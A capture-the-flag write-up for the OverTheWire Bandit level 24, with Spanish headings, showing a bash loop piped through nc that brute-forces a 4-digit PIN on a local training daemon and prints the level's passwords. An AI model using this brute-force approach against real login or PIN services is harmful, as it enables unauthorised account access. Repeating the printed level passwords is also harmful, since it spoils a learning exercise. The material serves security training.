# Retos Bandit

## Objetivos

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

## Datos de acceso

User: bandit24
Password: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
Host: bandit.labs.overthewire.org  
Port: 2220

## Solución

``` Bash

bandit24@bandit:~$ nc localhoost 30002
nc: getaddrinfo for host "localhoost" port 30002: Temporary failure in name resolution
bandit24@bandit:~$ echo {0000..0005}
0000 0001 0002 0003 0004 0005
bandit24@bandit:~$ echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar  {0000..0005}
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0000 0001 0002 0003 0004 0005
bandit24@bandit:~$ for i in {0000..0005}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0000
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0001
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0002
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0003
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0004
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0005
bandit24@bandit:~$ for i in {0000..0005}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Timeout. Exiting.
bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep -v Wrong!
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
```

## Notas adicionales

## Referencias